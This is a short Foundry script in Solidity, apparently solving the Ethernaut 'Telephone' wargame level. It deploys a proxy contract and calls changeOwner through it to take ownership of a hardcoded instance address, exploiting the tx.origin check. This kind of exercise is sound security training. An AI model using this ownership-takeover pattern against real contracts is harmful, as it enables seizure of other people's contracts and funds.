// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Ethernaut.sol";
import "../src/Fallback/Fallback.sol";
import "../src/Telephone/TelephoneProxyHack.sol";

contract TelephoneScript is Script {
    address myWallet = 0x02741b454A2841e7A866f6DA2387C8FCf3C9601C;

    function setUp() public {}

    function run() public {
        // Setup
        vm.startBroadcast();
        address instance = 0x1F21c587CD4135C8c6e0359380515273C4F2253f;
        
        // Hacking
        TelephoneProxyHack proxy = new TelephoneProxyHack();
        proxy.doTheMagic(instance, abi.encodeWithSignature("changeOwner(address)", myWallet));

        vm.stopBroadcast();
    }
}